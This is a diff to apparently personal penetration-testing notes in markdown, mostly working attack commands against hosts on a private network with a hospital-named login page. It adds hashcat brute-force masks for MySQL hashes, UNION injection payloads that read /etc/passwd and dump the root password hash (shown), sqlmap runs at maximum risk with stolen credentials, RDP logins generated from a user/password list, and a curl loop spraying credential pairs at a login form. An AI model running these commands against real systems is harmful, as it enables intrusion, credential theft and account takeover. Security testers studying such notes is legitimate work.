@@ -251,6 +251,48 @@ Table: user
 +--------+-------------------------------------------+
 ```
 
+---
+
+## hashcat
+
+root password is using old MySQL hash encryption
+
+hashcat using GPUs to crack hashes
+
+<https://www.sans.org/blog/password-hash-cracking-amazon-web-services/>
+
+Good detailed explanation here <https://youtu.be/IwthyvvcqzY> - `Crack MySQL - SHA1 / SHA2 passwords using the Hashcat tool`
+
+hashcat help
+
+```bash
+hashcat --help
+```
+
+benchmark module 300, `MySQL4.1/MySQL5`, Database Server
+
+```bash
+hashcat -m 300 -b
+```
+
+other sample of using hashcat command
+
+```bash
+hashcat -O -m 300 -a 3 --increment --increment-min 1 --increment-max 12 hash-this.txt ?a?a?a?a?a?a?a?a?a?a?a?a
+
+hashcat -O -m 300 -a 3 --increment --increment-min 1 --increment-max 12 hash-this.txt ?d?d?d?d?d?d?d?d?d?d?d?d
+
+hashcat -O -m 300 -a 3 --increment --increment-min 1 --increment-max 12 hash-this.txt ?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d
+
+hashcat -O -m 300 -a 3 hash-this.txt
+```
+
+<https://github.com/kkrypt0nn/wordlists>
+
+<https://github.com/danielmiessler/SecLists/tree/master/Passwords>
+
+---
+
 checking other databases and their tables
 
 ```bash
@@ -369,6 +411,82 @@ load_file(/etc/passwd)
 ' UNION SELECT 1,2,load_file(/etc/passwd),4,5,6,7,8,9 #    <--this might now work if the `load_file` is disabled on the server.
 
 ' UNION SELECT 1,current_user(),session_user(),4,5,6,7,8,9 #
+
+```
+
+---
+
+## testing SQLmap with user authenticantion
+
+* <https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap>
+
+```bash
+-u "<URL>" 
+-p "<PARAM TO TEST>" 
+--user-agent=SQLMAP 
+--random-agent 
+--threads=10 
+--risk=3 #MAX
+--level=5 #MAX
+--dbms="<KNOWN DB TECH>" 
+--os="<OS>"
+--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+--proxy=http://127.0.0.1:8080
+--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
+```
+
+```bash
+sqlmap -u ${URL} --batch --auth-type="Basic" --auth-cred="douglas:1m1ghtbwrong?" --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5
+```
+
+authentication didn't work...
+
+trying sql UNION in the browser `' UNION SELECT 1,Password,User,4,5,6,7,8,9 FROM mysql.user WHERE user="root"#`
+
+```bash
+root
+*4D4660866D8BB729116A6BBE5913441937DF1432
+```
+
+```bash
+sqlmap -u ${URL} --batch --auth-type="NTLM" --auth-cred="ARMSDON\root:4D4660866D8BB729116A6BBE5913441937DF1432" --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5
+```
+
+```bash
+sqlmap -u "<URL>" --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --dbms="MySQL" --os="ubuntu" --technique="UB" --batch --auth-type="Digest" --auth-cred="root:4D4660866D8BB729116A6BBE5913441937DF1432" --union-char "GsFRts2"
+```
+
+---
+
+DOMAIN="ARMSDON"
+USER=${USER}
+PASSWORD=${PASSWORD}
+
+xfreerdp /v:10.102.3.75 /u:${DOMAIN}\${USER} /p:${PASSWORD}
+
+cat userpass.txt | awk -F ',' '{ print "xfreerdp /v:10.102.3.75 /u:${DOMAIN}\${$1}" '
+
+cat userpass.txt | awk -F ',' '{ print "xfreerdp /v:10.102.3.75 /u:ARMSDON\\" $1 " /p:" $2 }'
+
+---
+
+SQL map is much faster using ${URL} with valid usnername/password
+
+---
+
+testing some manual scripts
+
+```bash
+
+for LIST in $(cat users-pass.txt); do
+    USERNAME=$(echo $LIST| awk -F ';' '{print $1}')
+    PASSWORD=$(echo $LIST| awk -F ';' '{print $2}')
+    echo "$USERNAME and ${PASSWORD}"
+    curl --silent "http://10.102.7.214/login?hospital=fitton&email=${USERNAME}%40fitton.hospital.com&password=${PASSWORD}" | wc -l
+done
 
 
 ```
